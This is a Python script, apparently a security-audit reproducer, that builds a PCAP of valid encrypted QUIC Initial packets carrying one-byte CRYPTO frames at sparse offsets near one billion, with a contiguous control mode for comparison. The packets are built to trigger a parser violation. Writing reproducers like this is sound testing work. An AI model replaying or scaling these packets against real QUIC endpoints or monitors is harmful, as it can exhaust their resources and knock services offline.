#!/usr/bin/env python3
"""Generate authenticated QUIC Initial packets with sparse CRYPTO offsets.

Produced by gpt-5.6-sol from Trail of Bits. Adapted using Opus 4.8 to use
higher-level Scapy functionality. Also lowered the default packets and frames
per packet settings drastically as the produced PCAP is only used to trigger
a violation when crypto frames carry data beyond offset 2**14 + 256.
"""

import argparse
import functools
import hashlib
import hmac
import struct
from pathlib import Path

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from scapy.all import IP, UDP, Ether, wrpcap

INITIAL_SALT = bytes.fromhex("38762cf7f55934b34d179ae6a4c80cadccbb7f0a")
DESTINATION_CONNECTION_ID = bytes.fromhex("8394c8f03e515708")
SOURCE_IP = "192.0.2.1"
DESTINATION_IP = "192.0.2.2"
SOURCE_PORT = 49152
DESTINATION_PORT = 443


def hkdf_expand(secret: bytes, info: bytes, length: int) -> bytes:
    """Expand an HKDF-SHA256 secret."""
    output = b""
    block = b""
    counter = 1
    while len(output) < length:
        block = hmac.new(
            secret, block + info + bytes([counter]), hashlib.sha256
        ).digest()
        output += block
        counter += 1
    return output[:length]


def expand_label(secret: bytes, label: bytes, length: int) -> bytes:
    """Apply TLS 1.3 HKDF-Expand-Label."""
    full_label = b"tls13 " + label
    info = struct.pack("!H", length) + bytes([len(full_label)]) + full_label + b"\x00"
    return hkdf_expand(secret, info, length)


@functools.cache
def initial_keys() -> tuple[bytes, bytes, bytes]:
    """Derive QUIC v1 client Initial packet-protection keys."""
    initial_secret = hmac.new(
        INITIAL_SALT, DESTINATION_CONNECTION_ID, hashlib.sha256
    ).digest()
    client_secret = expand_label(initial_secret, b"client in", 32)
    return (
        expand_label(client_secret, b"quic key", 16),
        expand_label(client_secret, b"quic iv", 12),
        expand_label(client_secret, b"quic hp", 16),
    )


def encode_varint(value: int) -> bytes:
    """Encode a QUIC variable-length integer."""
    if value < 2**6:
        return bytes([value])
    if value < 2**14:
        return struct.pack("!H", value | 0x4000)
    if value < 2**30:
        return struct.pack("!I", value | 0x80000000)
    if value < 2**62:
        return struct.pack("!Q", value | 0xC000000000000000)
    raise ValueError("QUIC variable-length integer is too large")


def make_quic_initial(packet_number: int, crypto_offsets: range) -> bytes:
    """Build one valid QUIC v1 Initial carrying sparse one-byte CRYPTO frames."""
    key, iv, hp_key = initial_keys()
    plaintext = b"".join(
        b"\x06" + encode_varint(crypto_offset) + b"\x01A"
        for crypto_offset in crypto_offsets
    )
    packet_number_bytes = bytes([packet_number & 0xFF])
    protected_length = len(packet_number_bytes) + len(plaintext) + 16
    header = (
        b"\xc0\x00\x00\x00\x01"
        + bytes([len(DESTINATION_CONNECTION_ID)])
        + DESTINATION_CONNECTION_ID
        + b"\x00\x00"
        + encode_varint(protected_length)
        + packet_number_bytes
    )
    nonce = bytearray(iv)
    nonce[-1] ^= packet_number & 0xFF
    ciphertext = AESGCM(key).encrypt(bytes(nonce), plaintext, header)
    packet = bytearray(header + ciphertext)
    packet_number_offset = len(header) - 1
    sample = packet[packet_number_offset + 4 : packet_number_offset + 20]
    encryptor = Cipher(algorithms.AES(hp_key), modes.ECB()).encryptor()
    mask = encryptor.update(bytes(sample)) + encryptor.finalize()
    packet[0] ^= mask[0] & 0x0F
    packet[packet_number_offset] ^= mask[1]
    return bytes(packet)


def make_frame(payload: bytes, index: int):
    """Wrap a QUIC datagram in Ethernet, IPv4, and UDP with Scapy."""
    pkt = (
        Ether(src="02:00:00:00:00:01", dst="02:00:00:00:00:02")
        / IP(src=SOURCE_IP, dst=DESTINATION_IP, id=index & 0xFFFF, ttl=64, flags="DF")
        / UDP(sport=SOURCE_PORT, dport=DESTINATION_PORT)
        / payload
    )
    # Deterministic, strictly increasing timestamps so the capture is
    # byte-for-byte reproducible regardless of when the script is run.
    pkt.time = 1 + index / 1_000_000
    return pkt


def write_pcap(
    path: Path, packet_count: int, frames_per_packet: int, control: bool
) -> None:
    """Write either sparse attack packets or contiguous control packets."""
    packets = []
    for index in range(packet_count):
        if control:
            first_offset = index * frames_per_packet
            offsets = range(first_offset, first_offset + frames_per_packet)
        else:
            first_offset = 1_000_000_000 - (index * frames_per_packet * 2)
            last_offset = first_offset - (frames_per_packet * 2)
            offsets = range(first_offset, last_offset, -2)
        packets.append(make_frame(make_quic_initial(index, offsets), index))
    wrpcap(str(path), packets)


def main() -> None:
    """Parse arguments and generate the reproducer PCAP."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--packets", type=int, default=50)
    parser.add_argument("--frames-per-packet", type=int, default=7)
    parser.add_argument("--control", action="store_true")
    parser.add_argument("--output", type=Path, default=Path(__file__).with_suffix(""))
    args = parser.parse_args()
    if not 1 <= args.packets <= 350_000:
        parser.error("--packets must be between 1 and 350000")
    if not 1 <= args.frames_per_packet <= 1_400:
        parser.error("--frames-per-packet must be between 1 and 1400")
    write_pcap(args.output, args.packets, args.frames_per_packet, args.control)


if __name__ == "__main__":
    main()
